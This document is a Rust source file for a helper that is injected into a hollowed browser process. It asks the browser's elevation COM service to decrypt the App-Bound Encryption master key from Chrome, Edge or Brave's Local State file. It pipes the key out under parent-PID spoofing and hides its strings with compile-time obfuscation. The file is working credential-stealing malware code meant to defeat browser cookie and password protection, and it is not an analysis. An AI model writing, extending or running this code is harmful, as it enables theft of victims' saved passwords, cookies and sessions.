//! abe-helper — runs *inside* a hollowed browser process (mapped manually by
//! xfill's native/src/abe.rs) and asks the browser's own elevation service
//! (IElevator COM local server) to decrypt the App-Bound Encryption (v20)
//! master key stored in the browser's "Local State" file.
//!
//!   abe-helper.exe "<path\to\Local State>" <chrome|edge|brave> ["\\.\pipe\name"]
//!
//! On success the 32-byte AES key is written as the fixed line
//! `KEYOK:<64 lowercase hex>\n` to the named pipe if given (the caller cannot
//! rely on handle inheritance when it spoofs our parent), otherwise to
//! stdout. Exit code 0 on success, non-zero on any failure, no error output.
//!
//! no_std by design: the parent maps this image itself and only resolves
//! imports from DLLs that are guaranteed present (and identically based) in
//! every suspended process — kernel32/ntdll. ole32/oleaut32 are loaded at
//! runtime from inside the target process via LoadLibraryW/GetProcAddress so
//! their addresses are valid there.
//!
//! Per-browser CLSID/IID and the IElevator vtable layout follow the public
//! PoC xaitax/Chrome-App-Bound-Encryption-Decryption (src/chrome_decrypt.cpp,
//! v0.15.0):
//!   https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption

#![no_std]
#![no_main]

use core::ffi::c_void;
use core::ptr;

type Handle = *mut c_void;

const GENERIC_READ: u32 = 0x8000_0000;
const GENERIC_WRITE: u32 = 0x4000_0000;
const FILE_SHARE_ALL: u32 = 0x7;
const OPEN_EXISTING: u32 = 3;
const FILE_ATTRIBUTE_NORMAL: u32 = 0x80;
const MEM_COMMIT_RESERVE: u32 = 0x3000;
const PAGE_READWRITE: u32 = 0x4;
const STD_OUTPUT_HANDLE: u32 = 0xFFFF_FFF5; // (DWORD)-11
const INVALID_HANDLE: Handle = -1isize as Handle;
const CLSCTX_LOCAL_SERVER: u32 = 0x4;
const COINIT_APARTMENTTHREADED: u32 = 0;
const RPC_C_AUTHN_DEFAULT: u32 = 0xFFFF_FFFF;
const RPC_C_AUTHZ_DEFAULT: u32 = 0xFFFF_FFFF;
const RPC_C_AUTHN_LEVEL_PKT_PRIVACY: u32 = 6;
const RPC_C_IMP_LEVEL_IMPERSONATE: u32 = 3;
const EOAC_DYNAMIC_CLOAKING: u32 = 0x40;
const MAX_LOCAL_STATE: i64 = 64 * 1024 * 1024;

// kernel32 is guaranteed to be mapped (at the same base) in every suspended
// process, so a static import from it is safe for manual mapping.
#[link(name = "kernel32")]
extern "system" {
    fn GetCommandLineW() -> *const u16;
    fn GetStdHandle(n_std_handle: u32) -> Handle;
    fn WriteFile(h: Handle, buf: *const u8, len: u32, written: *mut u32, overlapped: *mut c_void) -> i32;
    fn ExitProcess(code: u32) -> !;
    fn LoadLibraryW(name: *const u16) -> Handle;
    fn GetProcAddress(module: Handle, name: *const u8) -> *mut c_void;
    fn CreateFileW(
        name: *const u16,
        access: u32,
        share: u32,
        sa: *mut c_void,
        disposition: u32,
        flags: u32,
        template: Handle,
    ) -> Handle;
    fn GetFileSizeEx(h: Handle, size: *mut i64) -> i32;
    fn ReadFile(h: Handle, buf: *mut u8, len: u32, read: *mut u32, overlapped: *mut c_void) -> i32;
    fn CloseHandle(h: Handle) -> i32;
    fn VirtualAlloc(addr: *mut c_void, size: usize, alloc_type: u32, protect: u32) -> *mut c_void;
}

#[repr(C)]
struct Guid {
    d1: u32,
    d2: u16,
    d3: u16,
    d4: [u8; 8],
}

struct BrowserCom {
    clsid: Guid,
    iid: Guid,
    /// Index of DecryptData in the IElevator vtable.
    decrypt_vtable_index: usize,
}

// Chrome: CLSID {708860E0-F641-4611-8895-7D867DD3675B},
//         IID  {463ABECF-410D-407F-8AF5-0DF35A005CC8}
// Vtable: IUnknown(3) + RunRecoveryCRXElevated + EncryptData + DecryptData => 5.
const CHROME_COM: BrowserCom = BrowserCom {
    clsid: Guid { d1: 0x708860E0, d2: 0xF641, d3: 0x4611, d4: [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B] },
    iid: Guid { d1: 0x463ABECF, d2: 0x410D, d3: 0x407F, d4: [0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8] },
    decrypt_vtable_index: 5,
};

// Chrome 144+ added the IElevator2 family; current Chrome (154+) no longer
// answers the v1 vendor IID (E_NOINTERFACE). IElevator2Chrome shares the v1
// vtable layout, so DecryptData is still at index 5.
// IID {1BF5208B-295F-4992-B5F4-3A9BB6494838}
const CHROME_COM_V2: BrowserCom = BrowserCom {
    clsid: Guid { d1: 0x708860E0, d2: 0xF641, d3: 0x4611, d4: [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B] },
    iid: Guid { d1: 0x1BF5208B, d2: 0x295F, d3: 0x4992, d4: [0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38] },
    decrypt_vtable_index: 5,
};

// Edge: CLSID {1FCBE96C-1697-43AF-9140-2897C7C69767},
//       IID  {C9C2B807-7731-4F34-81B7-44FF7779522B}
// Vtable has three extra base placeholder methods before
// RunRecoveryCRXElevated => DecryptData at index 8.
const EDGE_COM: BrowserCom = BrowserCom {
    clsid: Guid { d1: 0x1FCBE96C, d2: 0x1697, d3: 0x43AF, d4: [0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67] },
    iid: Guid { d1: 0xC9C2B807, d2: 0x7731, d3: 0x4F34, d4: [0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B] },
    decrypt_vtable_index: 8,
};

// Brave: CLSID {576B31AF-6369-4B6B-8560-E4B203A97A8B},
//        IID  {F396861E-0C8E-4C71-8256-2FAE6D759CE9}
const BRAVE_COM: BrowserCom = BrowserCom {
    clsid: Guid { d1: 0x576B31AF, d2: 0x6369, d3: 0x4B6B, d4: [0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B] },
    iid: Guid { d1: 0xF396861E, d2: 0x0C8E, d3: 0x4C71, d4: [0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9] },
    decrypt_vtable_index: 5,
};

#[panic_handler]
fn panic_handler(_: &core::panic::PanicInfo) -> ! {
    unsafe { ExitProcess(70) }
}

// compiler-builtins' mem symbols are normally pulled in via std; with no_std
// on MSVC we must provide them ourselves.
#[no_mangle]
pub unsafe extern "C" fn memcpy(dest: *mut u8, src: *const u8, n: usize) -> *mut u8 {
    let mut i = 0;
    while i < n {
        *dest.add(i) = *src.add(i);
        i += 1;
    }
    dest
}

// ---------------------------------------------------------------------------
// Compile-time string obfuscation (this image is embedded in xfill.dll, so
// its plaintext strings would ride along into the DLL).
// ---------------------------------------------------------------------------

/// FNV-1a of the literal folded to a non-zero key byte.
const fn xkey<const N: usize>(s: &[u8; N]) -> u8 {
    let mut h: u32 = 0x811c9dc5;
    let mut i = 0;
    while i < N {
        h ^= s[i] as u32;
        h = h.wrapping_mul(0x01000193);
        i += 1;
    }
    (h as u8) | 1
}

const fn xenc<const N: usize>(s: &[u8; N], key: u8) -> [u8; N] {
    let mut out = [0u8; N];
    let mut i = 0;
    while i < N {
        out[i] = s[i] ^ key ^ (i as u8).wrapping_mul(0xA7);
        i += 1;
    }
    out
}

/// `obf!(b"literal\0")` -> `(&ENC_BYTES, KEY)`; decode with obf_bytes/obf_wide.
macro_rules! obf {
    ($s:literal) => {{
        const KEY: u8 = xkey($s);
        const ENC: &[u8] = &xenc($s, KEY);
        (ENC, KEY)
    }};
}

/// Decode into a zero-padded byte buffer of capacity N (>= enc.len()).
fn obf_bytes<const N: usize>(enc: &[u8], key: u8) -> [u8; N] {
    let mut out = [0u8; N];
    let mut i = 0;
    while i < enc.len() && i < N {
        out[i] = enc[i] ^ key ^ (i as u8).wrapping_mul(0xA7);
        i += 1;
    }
    out
}

/// Decode into a zero-padded wide buffer of capacity N (>= enc.len()).
fn obf_wide<const N: usize>(enc: &[u8], key: u8) -> [u16; N] {
    let mut out = [0u16; N];
    let mut i = 0;
    while i < enc.len() && i < N {
        out[i] = (enc[i] ^ key ^ (i as u8).wrapping_mul(0xA7)) as u16;
        i += 1;
    }
    out
}

#[no_mangle]
pub unsafe extern "C" fn memmove(dest: *mut u8, src: *const u8, n: usize) -> *mut u8 {
    memcpy(dest, src, n)
}

#[no_mangle]
pub unsafe extern "C" fn memset(dest: *mut u8, c: i32, n: usize) -> *mut u8 {
    let mut i = 0;
    while i < n {
        *dest.add(i) = c as u8;
        i += 1;
    }
    dest
}

#[no_mangle]
pub unsafe extern "C" fn memcmp(a: *const u8, b: *const u8, n: usize) -> i32 {
    let mut i = 0;
    while i < n {
        let (x, y) = (*a.add(i), *b.add(i));
        if x != y {
            return x as i32 - y as i32;
        }
        i += 1;
    }
    0
}

#[no_mangle]
pub extern "C" fn mainCRTStartup() {
    let code = unsafe { run() };
    unsafe { ExitProcess(code) }
}

unsafe fn run() -> u32 {
    let cmd = GetCommandLineW();
    if cmd.is_null() {
        return 2;
    }
    let Some((_, _, rest)) = next_arg(cmd) else { return 2 };
    let Some((path_ptr, path_len, rest)) = next_arg(rest) else { return 2 };
    let Some((name_ptr, name_len, rest)) = next_arg(rest) else { return 2 };
    // Optional 4th arg: named pipe to write the key to. Under parent-PID
    // spoofing the child inherits handles from the spoofed parent, not the
    // creator, so an inherited anonymous pipe never reaches us.
    let pipe_arg = next_arg(rest);

    let com = if w_eq_ci(name_ptr, name_len, b"chrome") {
        &CHROME_COM
    } else if w_eq_ci(name_ptr, name_len, b"edge") {
        &EDGE_COM
    } else if w_eq_ci(name_ptr, name_len, b"brave") {
        &BRAVE_COM
    } else {
        return 2;
    };

    let mut path_buf = [0u16; 2048];
    if path_len == 0 || path_len >= path_buf.len() {
        return 2;
    }
    ptr::copy_nonoverlapping(path_ptr, path_buf.as_mut_ptr(), path_len);

    let mut pipe_buf = [0u16; 256];
    let mut pipe_ptr: *const u16 = ptr::null();
    if let Some((p, l, _)) = pipe_arg {
        if l == 0 || l >= pipe_buf.len() {
            return 2;
        }
        ptr::copy_nonoverlapping(p, pipe_buf.as_mut_ptr(), l);
        pipe_ptr = pipe_buf.as_ptr();
    }

    let Some((data, data_len)) = read_local_state(path_buf.as_ptr()) else {
        return 3;
    };
    let data = core::slice::from_raw_parts(data, data_len);
    let Some((enc, enc_len)) = extract_encrypted_key(data) else {
        return 4;
    };

    let mut key = [0u8; 32];
    // Chrome: try the 144+ IElevator2Chrome IID first, fall back to v1.
    let ok = if core::ptr::eq(com, &CHROME_COM) {
        com_decrypt(&CHROME_COM_V2, enc, enc_len, key.as_mut_ptr())
            || com_decrypt(com, enc, enc_len, key.as_mut_ptr())
    } else {
        com_decrypt(com, enc, enc_len, key.as_mut_ptr())
    };
    if !ok {
        return 8;
    }

    // Fixed-shape success line: "KEYOK:" + 64 hex + '\n'. The parent rejects
    // anything that does not match this exactly.
    const HEXD: &[u8; 16] = b"0123456789abcdef";
    let (m_enc, m_key) = obf!(b"KEYOK:");
    let magic = obf_bytes::<8>(m_enc, m_key);
    let mut line = [0u8; 6 + 64 + 1];
    line[..6].copy_from_slice(&magic[..6]);
    for (i, &b) in key.iter().enumerate() {
        line[6 + 2 * i] = HEXD[(b >> 4) as usize];
        line[6 + 2 * i + 1] = HEXD[(b & 0xF) as usize];
    }
    line[70] = b'\n';
    ptr::write_bytes(key.as_mut_ptr(), 0, 32);

    if !emit(pipe_ptr, &line) {
        return 9;
    }
    0
}

/// Write the result to the named pipe if given, else stdout.
unsafe fn emit(pipe: *const u16, data: &[u8]) -> bool {
    if !pipe.is_null() {
        let h = CreateFileW(
            pipe,
            GENERIC_WRITE,
            0,
            ptr::null_mut(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            ptr::null_mut(),
        );
        if h.is_null() || h == INVALID_HANDLE {
            return false;
        }
        let mut written: u32 = 0;
        let ok = WriteFile(h, data.as_ptr(), data.len() as u32, &mut written, ptr::null_mut());
        CloseHandle(h);
        return ok != 0;
    }
    let stdout = GetStdHandle(STD_OUTPUT_HANDLE);
    if stdout.is_null() || stdout == INVALID_HANDLE {
        return false;
    }
    let mut written: u32 = 0;
    WriteFile(stdout, data.as_ptr(), data.len() as u32, &mut written, ptr::null_mut()) != 0
}

/// Parse the next whitespace-separated (or quoted) argument from a wide
/// command line. Returns (arg_start, arg_len, rest).
unsafe fn next_arg(mut p: *const u16) -> Option<(*const u16, usize, *const u16)> {
    while *p != 0 && *p <= 0x20 {
        p = p.add(1);
    }
    if *p == 0 {
        return None;
    }
    if *p == b'"' as u16 {
        let start = p.add(1);
        let mut end = start;
        while *end != 0 && *end != b'"' as u16 {
            end = end.add(1);
        }
        let rest = if *end == 0 { end } else { end.add(1) };
        Some((start, end.offset_from(start) as usize, rest))
    } else {
        let start = p;
        let mut end = start;
        while *end != 0 && *end > 0x20 {
            end = end.add(1);
        }
        Some((start, end.offset_from(start) as usize, end))
    }
}

/// Case-insensitive compare of a wide arg against a lowercase ASCII literal.
unsafe fn w_eq_ci(p: *const u16, len: usize, s: &[u8]) -> bool {
    if len != s.len() {
        return false;
    }
    for i in 0..len {
        let c = *p.add(i);
        if c > 0xFF || (c as u8).to_ascii_lowercase() != s[i] {
            return false;
        }
    }
    true
}

unsafe fn read_local_state(path: *const u16) -> Option<(*mut u8, usize)> {
    let h = CreateFileW(
        path,
        GENERIC_READ,
        FILE_SHARE_ALL,
        ptr::null_mut(),
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        ptr::null_mut(),
    );
    if h.is_null() || h == INVALID_HANDLE {
        return None;
    }
    let mut size: i64 = 0;
    if GetFileSizeEx(h, &mut size) == 0 || size <= 0 || size > MAX_LOCAL_STATE {
        CloseHandle(h);
        return None;
    }
    let buf = VirtualAlloc(ptr::null_mut(), size as usize, MEM_COMMIT_RESERVE, PAGE_READWRITE) as *mut u8;
    if buf.is_null() {
        CloseHandle(h);
        return None;
    }
    let mut total: usize = 0;
    while total < size as usize {
        let mut n: u32 = 0;
        let want = core::cmp::min(size as usize - total, 0x4000_0000) as u32;
        if ReadFile(h, buf.add(total), want, &mut n, ptr::null_mut()) == 0 || n == 0 {
            break;
        }
        total += n as usize;
    }
    CloseHandle(h);
    if total != size as usize {
        return None;
    }
    Some((buf, total))
}

/// Locate "app_bound_encrypted_key" in Local State, base64-decode it, and
/// strip the 4-byte "APPB" prefix. Returns a pointer into a fresh allocation.
unsafe fn extract_encrypted_key(data: &[u8]) -> Option<(*const u8, usize)> {
    let (enc, key) = obf!(b"\"app_bound_encrypted_key\"");
    let tag_buf = obf_bytes::<32>(enc, key);
    let tag = &tag_buf[..enc.len()];
    let pos = data.windows(tag.len()).position(|w| w == tag)?;
    let after = pos + tag.len();
    let q1 = data.get(after..)?.iter().position(|&c| c == b'"')? + after;
    let q2 = data.get(q1 + 1..)?.iter().position(|&c| c == b'"')? + q1 + 1;
    let b64 = data.get(q1 + 1..q2)?;
    if b64.is_empty() || b64.len() % 4 != 0 {
        return None;
    }
    let out = VirtualAlloc(ptr::null_mut(), b64.len(), MEM_COMMIT_RESERVE, PAGE_READWRITE) as *mut u8;
    if out.is_null() {
        return None;
    }
    let n = b64_decode(b64, out)?;
    let (enc, key) = obf!(b"APPB");
    let appb = obf_bytes::<8>(enc, key);
    if n <= 4 || core::slice::from_raw_parts(out, 4) != &appb[..4] {
        return None;
    }
    Some((out.add(4), n - 4))
}

fn b64_decode(input: &[u8], out: *mut u8) -> Option<usize> {
    let mut acc: u32 = 0;
    let mut bits: u32 = 0;
    let mut n = 0usize;
    for &c in input {
        let v: u32 = match c {
            b'A'..=b'Z' => (c - b'A') as u32,
            b'a'..=b'z' => (c - b'a' + 26) as u32,
            b'0'..=b'9' => (c - b'0' + 52) as u32,
            b'+' => 62,
            b'/' => 63,
            b'=' => break,
            _ => return None,
        };
        acc = (acc << 6) | v;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            unsafe {
                *out.add(n) = (acc >> bits) as u8;
            }
            n += 1;
        }
    }
    Some(n)
}

type CoInitializeExFn = unsafe extern "system" fn(*mut c_void, u32) -> i32;
type CoCreateInstanceFn =
    unsafe extern "system" fn(*const Guid, *mut c_void, u32, *const Guid, *mut *mut c_void) -> i32;
type CoSetProxyBlanketFn = unsafe extern "system" fn(
    *mut c_void,
    u32,
    u32,
    *mut u16,
    u32,
    u32,
    *mut c_void,
    u32,
) -> i32;
type CoUninitializeFn = unsafe extern "system" fn();
type SysAllocStringByteLenFn = unsafe extern "system" fn(*const u8, u32) -> *mut u16;
type SysStringByteLenFn = unsafe extern "system" fn(*mut u16) -> u32;
type SysFreeStringFn = unsafe extern "system" fn(*mut u16);
type DecryptDataFn =
    unsafe extern "system" fn(*mut c_void, *mut u16, *mut *mut u16, *mut u32) -> i32;
type ReleaseFn = unsafe extern "system" fn(*mut c_void) -> u32;

unsafe fn gp(module: Handle, name: &[u8]) -> usize {
    GetProcAddress(module, name.as_ptr()) as usize
}

/// IElevator::DecryptData(BSTR in, BSTR* out, DWORD* err) via the browser's
/// elevation service. Writes the 32-byte key to key_out on success.
unsafe fn com_decrypt(com: &BrowserCom, enc: *const u8, enc_len: usize, key_out: *mut u8) -> bool {
    let (e, k) = obf!(b"ole32.dll\0");
    let ole32 = LoadLibraryW(obf_wide::<16>(e, k).as_ptr());
    if ole32.is_null() {
        return false;
    }
    let (e, k) = obf!(b"oleaut32.dll\0");
    let oleaut32 = LoadLibraryW(obf_wide::<16>(e, k).as_ptr());
    if oleaut32.is_null() {
        return false;
    }

    macro_rules! gp_obf {
        ($module:expr, $name:literal) => {{
            let (e, k) = obf!($name);
            let n = obf_bytes::<32>(e, k);
            gp($module, &n[..e.len()])
        }};
    }

    let addr = gp_obf!(ole32, b"CoInitializeEx\0");
    if addr == 0 {
        return false;
    }
    let co_init: CoInitializeExFn = core::mem::transmute(addr);
    let addr = gp_obf!(ole32, b"CoCreateInstance\0");
    if addr == 0 {
        return false;
    }
    let co_create: CoCreateInstanceFn = core::mem::transmute(addr);
    let addr = gp_obf!(ole32, b"CoUninitialize\0");
    if addr == 0 {
        return false;
    }
    let co_uninit: CoUninitializeFn = core::mem::transmute(addr);
    let addr = gp_obf!(oleaut32, b"SysAllocStringByteLen\0");
    if addr == 0 {
        return false;
    }
    let sys_alloc: SysAllocStringByteLenFn = core::mem::transmute(addr);
    let addr = gp_obf!(oleaut32, b"SysStringByteLen\0");
    if addr == 0 {
        return false;
    }
    let sys_len: SysStringByteLenFn = core::mem::transmute(addr);
    let addr = gp_obf!(oleaut32, b"SysFreeString\0");
    if addr == 0 {
        return false;
    }
    let sys_free: SysFreeStringFn = core::mem::transmute(addr);

    // S_FALSE (already initialized) is fine; only a negative HRESULT fails.
    if co_init(ptr::null_mut(), COINIT_APARTMENTTHREADED) < 0 {
        return false;
    }

    let mut obj: *mut c_void = ptr::null_mut();
    let hr = co_create(&com.clsid, ptr::null_mut(), CLSCTX_LOCAL_SERVER, &com.iid, &mut obj);
    if hr < 0 || obj.is_null() {
        co_uninit();
        return false;
    }

    // The PoC cloaks the proxy so the service sees this process's identity.
    let blanket_addr = gp_obf!(ole32, b"CoSetProxyBlanket\0");
    if blanket_addr != 0 {
        let blanket: CoSetProxyBlanketFn = core::mem::transmute(blanket_addr);
        blanket(
            obj,
            RPC_C_AUTHN_DEFAULT,
            RPC_C_AUTHZ_DEFAULT,
            ptr::null_mut(),
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            ptr::null_mut(),
            EOAC_DYNAMIC_CLOAKING,
        );
    }

    let in_bstr = sys_alloc(enc, enc_len as u32);
    if in_bstr.is_null() {
        let vtbl = *(obj as *const *const usize);
        let release: ReleaseFn = core::mem::transmute(vtbl.add(2).read());
        release(obj);
        co_uninit();
        return false;
    }

    let vtbl = *(obj as *const *const usize);
    let decrypt: DecryptDataFn = core::mem::transmute(vtbl.add(com.decrypt_vtable_index).read());
    let mut out_bstr: *mut u16 = ptr::null_mut();
    let mut com_err: u32 = 0;
    let hr = decrypt(obj, in_bstr, &mut out_bstr, &mut com_err);

    let mut ok = false;
    if hr >= 0 && !out_bstr.is_null() && sys_len(out_bstr) == 32 {
        ptr::copy_nonoverlapping(out_bstr as *const u8, key_out, 32);
        ok = true;
    }

    sys_free(in_bstr);
    if !out_bstr.is_null() {
        sys_free(out_bstr);
    }
    let release: ReleaseFn = core::mem::transmute(vtbl.add(2).read());
    release(obj);
    co_uninit();
    ok
}
